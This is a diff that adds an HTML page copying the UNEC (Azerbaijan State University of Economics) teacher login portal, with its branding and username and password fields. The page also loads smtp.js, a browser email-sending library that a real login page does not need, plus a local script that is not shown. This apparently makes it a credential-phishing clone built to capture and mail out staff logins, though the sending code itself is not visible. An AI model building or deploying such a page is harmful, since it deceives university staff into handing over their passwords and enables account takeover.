@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="language" http-equiv="content-language" content="az">
+
+
+    <title>Müəllim kabineti</title>
+    <meta name="description" content="login page">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <link rel="icon" type="image/x-icon" href="files/img/favicon.ico">
+
+    <!--Basic Styles-->
+    <link href="files/css/bootstrap.min.css" rel="stylesheet">
+    <link href="files/css/font-awesome.min.css" rel="stylesheet">
+
+
+    <link id="beyond-link" href="files/css/beyond.min.css" rel="stylesheet">
+    <link href="files/css/demo.min.css" rel="stylesheet">
+    <link href="files/css/animate.min.css" rel="stylesheet">
+    <link id="skin-link" href="" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" href="sass/style.css">
+
+    <style type="text/css">
+        @font-face {
+            font-family: Roboto;
+            src: url("chrome-extension://mcgbeeipkmelnpldkobichboakdfaeon/css/Roboto-Regular.ttf");
+        }
+    </style>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    
+</head>
+
+<body>
+
+    <!-- /Navbar -->
+
+
+    <div class="container-fluid">
+        <div class="jumbotron">
+            <div class="lang-panel-login col-md-12 col-xs-12">
+
+                <ul class="pull-right">
+                    <li><a class="selected" style="color:#8a868f" href="/az">az</a></li>
+                    <li><a class="" style="color:#8a868f" href="/en">en</a></li>
+                    <li><a class="" style="color:#8a868f" href="/ru">ru</a></li>
+                </ul>
+            </div>
+            <div class="login-left-part leftright col-md-6 col-xs-12">
+                <div class="col-md-12 col-xs-12">
+                    <img src="files/img/logoLoginPage.png" width="14%" alt="">
+                </div>
+                <div class="col-md-12 col-xs-12">
+                    <h4 style="font-family: 'Palatino Linotype'; margin-top: 30px;;">Azərbaycan Dövlət İqtisad
+                        Universiteti</h4>
+                </div>
+                <div class="col-md-12 ">
+                    <h2>UNEC</h2>
+                </div>
+
+                <div class="col-md-12">
+                    <img width="114" src="files/img/edumanlog.png" alt="">
+                </div>
+            </div>
+            <div class="login-right-part leftright col-md-6 col-xs-12 padding-top-20 padding-bottom-20">
+                <div class="col-md-12 col-xs-12 margin-top-10 padding-bottom-20">
+                    <h2>Müəllim kabineti</h2>
+                </div>
+                <div class="col-md-12 col-xs-12" style="padding-bottom:20px;">
+                    <h5>Bütün xidmətlərdən istifadə etmək üçün xahiş edirik öz hesabınıza daxil olun</h5>
+                </div>
+                <div class="col-md-12 col-xs-12 form-control-div">
+
+                    <form id="login-form" action="https://muallim.unec.edu.az/" method="post">
+                        <div class="inside_form_div">
+                            <div class="loginbox-textbox">
+                                <input class="user-l" placeholder="İstifadəçi adı" name="LoginForm[username]"
+                                    id="LoginForm_username" type="text">
+                            </div>
+                            <div class="loginbox-textbox">
+                                <input class="password-l" placeholder="Şifrə" name="LoginForm[password]"
+                                    id="LoginForm_password" type="password">
+                                <div class="loginbox-registration col-md-9" style="padding: 10px 0">
+                                    <a class="col-md-6 col-xs-12" href="/az/rpassword"></a>
+                                </div>
+                            </div>
+                            <div class="loginbox-forgot"></div>
+
+                            <div class="loginbox-textox" style="text-align: center;">
+
+                            </div>
+
+                            <div class="loginbox-submit">
+                                <input class="btn btn-primary btn-block" type="submit" name="yt0" value="Daxil ol">
+                            </div>
+
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="applyPopup">
+        <div id="popupModalInstructions" style="display: none;" aria-hidden="true" aria-labelledby="myLargeModalLabel"
+            role="dialog" tabindex="-1" class="modal fade bs-example-modal-lg in1">
+            <div class="modal-dialog modal-lg modal1  modal1-guide  ">
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <button aria-hidden="true" data-dismiss="modal" class="close" type="button"
+                            onclick="$('#popupModalInstructionsFrame').attr('src','');">×</button>
+                        <h4 id="myLargeModalLabel" class="modal-title"></h4>
+                    </div>
+                    <div class="modal-body">
+                        <iframe src="" id="popupModalInstructionsFrame" style="zoom:0.60" frameborder="0" height="500"
+                            width="99.6%"></iframe>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"
+        integrity="sha384-oBqDVmMz9ATKxIep9tiCxS/Z9fNfEXiDAYTujMAeBAsjFuCZSmKbSSUnQlmh/jp3"
+        crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.min.js"
+        integrity="sha384-mQ93GR66B00ZXjt0YO5KlohRA5SY2XofN4zfuZxLkoj1gXtW8ANNCe9d5Y3eG5eD"
+        crossorigin="anonymous"></script>
+    <script src="js/script.js"></script>
+
+
+</body>
+
+
+
+
+
+</html>
